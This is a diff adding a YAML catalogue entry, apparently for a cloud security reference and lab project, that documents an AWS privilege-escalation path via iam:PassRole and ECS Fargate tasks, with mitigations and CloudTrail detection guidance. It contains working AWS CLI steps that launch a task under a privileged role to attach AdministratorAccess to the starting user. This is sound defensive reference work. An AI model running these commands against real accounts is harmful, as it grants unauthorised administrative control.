@@ -1,0 +1,239 @@
+id: ecs-001
+name: iam:PassRole + ecs:CreateCluster + ecs:RegisterTaskDefinition + ecs:CreateService
+category: service-passrole
+services:
+  - iam
+  - ecs
+
+permissions:
+  required:
+    - permission: iam:PassRole
+      resourceConstraints: Must have permission to pass a role to ecs-tasks.amazonaws.com
+    - permission: ecs:CreateCluster
+      resourceConstraints: Must be able to create ECS clusters
+    - permission: ecs:RegisterTaskDefinition
+      resourceConstraints: Must be able to register task definitions
+    - permission: ecs:CreateService
+      resourceConstraints: Must be able to create ECS services
+  additional:
+    - permission: ec2:DescribeVpcs
+      resourceConstraints: Helpful for finding the default VPC for Fargate network configuration
+    - permission: ec2:DescribeSubnets
+      resourceConstraints: Helpful for finding subnets for Fargate network configuration
+    - permission: ecs:DescribeServices
+      resourceConstraints: Useful for monitoring service status during exploitation
+    - permission: ecs:DescribeTasks
+      resourceConstraints: Useful for monitoring task status during exploitation
+    - permission: ecs:ListTasks
+      resourceConstraints: Useful for listing tasks during exploitation
+    - permission: iam:ListRoles
+      resourceConstraints: Helpful for discovering available privileged roles to pass
+    - permission: iam:GetRole
+      resourceConstraints: Useful for viewing role permissions and trust policies
+
+description: A principal with `iam:PassRole`, `ecs:CreateCluster`, `ecs:RegisterTaskDefinition`, and `ecs:CreateService` can escalate privileges by creating a new ECS cluster, registering a task definition with a privileged IAM role, and launching the task via an ECS service. The task runs with the permissions of the passed role and can execute arbitrary code using the AWS CLI or SDK to modify the starting principal's permissions. This path is particularly useful because it works with Fargate launch type, eliminating the need for EC2 instance management, and the task automatically receives temporary credentials for the passed role.
+
+prerequisites:
+  admin:
+    - A role must exist that trusts ecs-tasks.amazonaws.com service principal
+    - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
+  lateral:
+    - A role must exist that trusts ecs-tasks.amazonaws.com service principal
+
+exploitationSteps:
+  awscli:
+    - step: 1
+      command: |
+        aws sts get-caller-identity
+      description: Get the AWS account ID needed for constructing role ARNs
+    - step: 2
+      command: |
+        aws ecs create-cluster --cluster-name privesc-cluster
+      description: Create a new ECS cluster to host the privileged task
+    - step: 3
+      command: |
+        aws ec2 describe-vpcs --filters "Name=isDefault,Values=true" --query "Vpcs[0].VpcId" --output text
+        aws ec2 describe-subnets --filters "Name=vpc-id,Values=<VPC_ID>" --query "Subnets[*].SubnetId" --output text
+      description: Retrieve the default VPC and subnet IDs required for Fargate network configuration
+    - step: 4
+      command: |
+        aws ecs register-task-definition \
+          --family privesc-task \
+          --network-mode awsvpc \
+          --requires-compatibilities FARGATE \
+          --cpu 256 \
+          --memory 512 \
+          --task-role-arn "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE" \
+          --execution-role-arn "arn:aws:iam::ACCOUNT_ID:role/ecsTaskExecutionRole" \
+          --container-definitions '[
+            {
+              "name": "privesc-container",
+              "image": "amazon/aws-cli",
+              "essential": true,
+              "command": [
+                "iam", "attach-user-policy",
+                "--user-name", "STARTING_USERNAME",
+                "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"
+              ]
+            }
+          ]'
+      description: Register a task definition that passes the privileged role and configures a container to execute AWS CLI commands for privilege escalation (e.g., attaching AdministratorAccess policy to the starting user)
+    - step: 5
+      command: |
+        aws ecs create-service \
+          --cluster privesc-cluster \
+          --service-name privesc-service \
+          --task-definition privesc-task \
+          --desired-count 1 \
+          --launch-type FARGATE \
+          --network-configuration "awsvpcConfiguration={subnets=[SUBNET_ID],assignPublicIp=ENABLED}"
+      description: Create an ECS service to launch the task. The service will start the task with the privileged role, and the container will execute the escalation command
+    - step: 6
+      command: |
+        aws ecs list-tasks --cluster privesc-cluster --service-name privesc-service
+        aws ecs describe-tasks --cluster privesc-cluster --tasks <TASK_ARN>
+      description: Monitor the task status and wait for it to reach STOPPED status, indicating the escalation commands have completed
+    - step: 7
+      command: |
+        aws sts get-caller-identity
+        aws iam list-attached-user-policies --user-name STARTING_USERNAME
+      description: Verify that the privilege escalation succeeded by checking if AdministratorAccess policy was attached to the starting user
+
+limitations: |
+  This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks or access to sensitive data.
+
+  For Fargate tasks, the container must have network connectivity to execute AWS API calls. The execution role (ecsTaskExecutionRole) needs permissions to pull container images from ECR if using private registries.
+
+recommendation: |
+  Restrict `iam:PassRole` using the principle of least privilege. Use IAM policy conditions to limit which roles can be passed and to which services:
+
+  {
+    "Effect": "Allow",
+    "Action": "iam:PassRole",
+    "Resource": "arn:aws:iam::ACCOUNT:role/SpecificRole",
+    "Condition": {
+      "StringEquals": {
+        "iam:PassedToService": "ecs-tasks.amazonaws.com"
+      }
+    }
+  }
+
+  Restrict access to `ecs:RegisterTaskDefinition` and `ecs:CreateService` to only principals that require them for legitimate workloads. Consider using tag-based conditions to limit which roles can be passed based on resource tags.
+
+  Monitor for unusual ECS activity in CloudTrail:
+  - `RegisterTaskDefinition` events with unfamiliar task roles
+  - `CreateCluster` followed quickly by `CreateService` from non-DevOps principals
+  - Short-lived tasks that make IAM policy changes
+  - Tasks using the Fargate launch type from unexpected principals
+
+  Use AWS Config rules to detect roles with overly permissive trust policies that allow ecs-tasks.amazonaws.com to assume them.
+
+discoveredBy:
+  name: Unknown
+  organization: Unknown
+
+learningEnvironments:
+  pathfinder-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinder-labs
+    scenario: iam-passrole+ecs-createcluster+ecs-registertaskdefinition+ecs-createservice
+    description: "Deploy Terraform scenarios individually or in groups, each with attack and cleanup scripts"
+attackVisualization:
+  nodes:
+  - id: start
+    label: starting-principal
+    type: principal
+    description: |
+      The principal with iam:PassRole, ecs:CreateCluster, ecs:RegisterTaskDefinition, and ecs:CreateService permissions. Can be an IAM user or role.
+  - id: task_definition
+    label: ECS Task Definition
+    type: resource
+    description: |
+      The registered ECS task definition with the target role passed via iam:PassRole. The task definition specifies a container image and commands that will execute with the target role's permissions when the task runs.
+  - id: ecs_service
+    label: ECS Service
+    type: resource
+    description: |
+      An ECS service created on Fargate that launches and maintains the task. The service ensures the task runs continuously until it completes its malicious actions.
+  - id: target_role
+    label: target-role
+    type: resource
+    description: |
+      The IAM role passed to the ECS task definition. Must trust ecs-tasks.amazonaws.com to assume it. When the task runs, it automatically assumes this role and executes with its permissions.
+  - id: admin_outcome
+    label: Effective Administrator
+    type: outcome
+    description: |
+      If the target role has administrative permissions (AdministratorAccess or equivalent), the attacker gains full administrative access. The task can attach admin policies to the starting principal or create new access keys with admin privileges.
+  - id: partial_outcome
+    label: Check for Additional Access
+    type: outcome
+    color: '#ffeb99'
+    description: |
+      If the target role has some elevated permissions but not full admin, the attacker gains partial privilege escalation. This could include access to data (S3, RDS, DynamoDB) or permissions enabling additional escalation paths.
+  - id: minimal_outcome
+    label: No Additional Access
+    type: outcome
+    color: '#cccccc'
+    description: |
+      If the target role only has minimal permissions, the privilege escalation may not provide meaningful additional access beyond what the starting principal already had.
+  edges:
+  - from: start
+    to: task_definition
+    label: iam:PassRole + ecs:CreateCluster + ecs:RegisterTaskDefinition
+    description: |
+      The attacker creates an ECS cluster and registers a task definition that passes a privileged role. The task definition includes a container with commands to escalate privileges.
+
+      Commands:
+      ```bash
+      aws ecs create-cluster --cluster-name exploit-cluster
+      aws ecs register-task-definition \
+        --family privesc-task \
+        --task-role-arn "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE" \
+        --network-mode awsvpc \
+        --requires-compatibilities FARGATE \
+        --cpu 256 --memory 512 \
+        --container-definitions '[{"name":"exploit","image":"amazon/aws-cli:latest","command":["iam","attach-user-policy","--user-name","STARTING_USER","--policy-arn","arn:aws:iam::aws:policy/AdministratorAccess"]}]'
+      ```
+  - from: task_definition
+    to: ecs_service
+    label: ecs:CreateService
+    description: |
+      The attacker creates an ECS service on Fargate that launches the task. The service maintains the task until it completes execution.
+
+      Command:
+      ```bash
+      aws ecs create-service \
+        --cluster exploit-cluster \
+        --service-name privesc-service \
+        --task-definition privesc-task \
+        --desired-count 1 \
+        --launch-type FARGATE \
+        --network-configuration "awsvpcConfiguration={subnets=[SUBNET_ID],assignPublicIp=ENABLED}"
+      ```
+  - from: ecs_service
+    to: target_role
+    label: Service launches task with role
+    description: |
+      When the ECS service starts, it launches the task which automatically assumes the target role. The container then executes with all permissions granted to the target role.
+  - from: target_role
+    to: admin_outcome
+    label: If role has admin permissions
+    branch: A
+    condition: admin
+    description: |
+      If the target role has AdministratorAccess or equivalent administrative permissions, the task successfully attaches admin policies to the starting principal, granting full administrative access to the account.
+  - from: target_role
+    to: partial_outcome
+    label: If role has some permissions
+    branch: B
+    condition: some_permissions
+    description: |
+      If the target role has elevated but non-administrative permissions, the task can perform limited privilege escalation. This might include accessing sensitive data or performing actions that enable further escalation.
+  - from: target_role
+    to: minimal_outcome
+    label: If role has minimal permissions
+    branch: C
+    condition: no_permissions
+    description: |
+      If the target role only has minimal permissions, the task execution may not yield meaningful privilege escalation. However, even limited access could be useful for reconnaissance.
